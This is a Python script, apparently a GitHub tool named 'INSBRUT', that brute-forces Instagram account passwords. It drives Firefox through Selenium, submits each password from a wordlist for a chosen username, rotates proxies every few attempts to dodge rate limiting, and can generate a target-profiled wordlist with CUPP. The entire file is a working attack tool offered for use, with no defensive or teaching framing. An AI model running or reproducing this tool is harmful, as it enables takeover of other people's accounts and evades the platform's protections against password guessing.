# github : 4pooo0
# too much tampering

from selenium import webdriver
import selenium
from selenium.webdriver.common.proxy import Proxy, ProxyType
import time
import platform
import os
from colorama import init, Fore

init()

def clear_terminal():
    if platform.system() == 'Windows':
        os.system('cls')
    elif platform.system() == 'Linux':
        os.system('clear')
    else:
        pass

def get_proxies_from_file(filename):
    proxies = []
    with open(filename, "r") as file:
        for line in file:
            proxy = line.strip()
            proxies.append(proxy)
    return proxies

def start_firefox_with_proxy(proxy):
    proxy_settings = Proxy()
    proxy_settings.proxy_type = ProxyType.MANUAL
    proxy_settings.http_proxy = proxy
    proxy_settings.ssl_proxy = proxy

    if platform.system() == 'Windows':
        firefox_path = 'C:\\Program Files\\Mozilla Firefox\\firefox.exe'
        geckodriver_path = 'geckodriver.exe'
        print('windows')
    elif platform.system() == 'Linux':
        firefox_path = '/usr/bin/firefox'
        geckodriver_path = 'geckodriver'
        print('linux')
    else:
        raise Exception('Operating system not supported.')


    firefox_options = webdriver.FirefoxOptions()
    firefox_options.binary_location = firefox_path

    profile = webdriver.FirefoxProfile()
    #firefox_options.add_argument("--headless")
    firefox_options.add_argument(f"--proxy-server={proxy}")
    firefox_options.add_argument("--private")
    firefox_options.add_argument('--disable-gpu')

    driver = webdriver.Firefox(executable_path=geckodriver_path, options=firefox_options, proxy=proxy_settings, firefox_profile=profile)

    clear_terminal()
    print("Firefox started ✅")

    return driver



def start_browsing_with_proxies(proxy_file, nameuser, pas_lis):
    proxies = get_proxies_from_file(proxy_file)
    current_proxy_index = 0

    while True:
        proxy = proxies[current_proxy_index]
        driver = start_firefox_with_proxy(proxy)
        print("Proxies started✅")

        driver.get("https://instagram.com/accounts/login/?next=%2Flogin%2F&source=desktop_nav")
        time.sleep(2)
        print("Instagram started✅")
        username_input = driver.find_element('xpath', '//*[@id="loginForm"]/div/div[1]/div/label/input')
        print("Instagram textbox finded✅")
        username_input.send_keys(nameuser)


        file_path = pas_lis
        my_list = []

        with open(file_path, "r", encoding="utf-8") as file:
            for line in file:
                line = str(line)
                line = line.strip()
                my_list.append(line)


        file.close()
        clear_terminal()
        i = 0
        leng = int(len(my_list))
        while i < leng:
            try:
                password_input = driver.find_element('xpath', '//*[@id="loginForm"]/div/div[2]/div/label/input')
                login_button = driver.find_element('xpath', '/html/body/div[2]/div/div/div[1]/div/div/div/div[1]/section/main/div/div/div[1]/div[2]/form/div[1]/div[3]/button')
                password_input.clear()
                password_input.send_keys(my_list[i])
                time.sleep(0.3)
                login_button.click()
                if i > 0:
                    print(Fore.RED + "❌❌WRONG PASSWORD❌❌ : {}".format(my_list[i - 1]) + Fore.RESET)


                if i % 3 == 0:
                    current_proxy_index = (current_proxy_index + 1) % len(proxies)

                time.sleep(1.8)
                i += 1

            except selenium.common.exceptions.NoSuchElementException:
                print(Fore.GREEN + "🔑🔑PASSWORD FOUND🔑🔑 : {}".format(my_list[i - 1]) + Fore.RESET)
                exit()
            except Exception as e:
                print(str(e))
                exit()

        time.sleep(30)
        driver.quit()


colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]



text = """
  _____ _   _  _____ ____  _____  _    _ _______ 
 |_   _| \ | |/ ____|  _ \|  __ \| |  | |__   __|
   | | |  \| | (___ | |_) | |__) | |  | |  | |   
   | | | . ` |\___ \|  _ <|  _  /| |  | |  | |   
  _| |_| |\  |____) | |_) | | \ \| |__| |  | |   
 |_____|_| \_|_____/|____/|_|  \_\\ ____/    |_|    v1
 _______________________________________________________________________
 |Don't forget to add the proxy list!                                  |
 |Do not forget that your list must not contain less than 8 characters!|
 |Keep your wordlist short so it can read utf-8                        |
 -----------------------------------------------------------------------
                 author (github) : 4pooo0 
"""

for i, char in enumerate(text):
    color = colors[i % len(colors)]
    print(color + char, end='')

print(Fore.RESET)

nameuser = input(Fore.LIGHTMAGENTA_EX + "instagram username : " + Fore.RESET)
if " " in nameuser:
    print("⚠please don't leave spaces⚠")
    exit()
elif nameuser == "":
    print("⚠please don't leave blank⚠")
    exit()

b = input(Fore.LIGHTMAGENTA_EX + "Do you want to make your own wordlist with cupp? [Y/n]" + Fore.RESET)
if b == "Y" or b == "y":
    os.system("python cupp/cupp.py -i")
    time.sleep(5)

    def get_new_files(seconds=60):
        files = []
        last_check_time = time.time() - seconds

        for filename in os.listdir():
            file_path = os.path.join(os.getcwd(), filename)
            if os.path.isfile(file_path):
                creation_time = os.path.getctime(file_path)

                if creation_time > last_check_time:
                    files.append(file_path)

        return files

    new_files = get_new_files(seconds=60)
    for newfile in new_files:
        pas_lis = newfile



elif b == "N" or b == "n":
    d = input(Fore.LIGHTMAGENTA_EX + "passwordlist path (press enter to use default): " + Fore.RESET)
    if d == "":
        pas_lis = 'wordlist/passwordlist.txt'
    else:
        try:
            with open(str(d), "r") as tets:
                tets.close()
                pass
            pas_lis = str(d)
        except UnicodeDecodeError:
            print("⚠sorry your wordlist is too long⚠")
            exit()

else:
    print("⚠please write y or n⚠")
    exit()


proxy_file = "proxy-list.txt"
start_browsing_with_proxies(proxy_file, nameuser, pas_lis)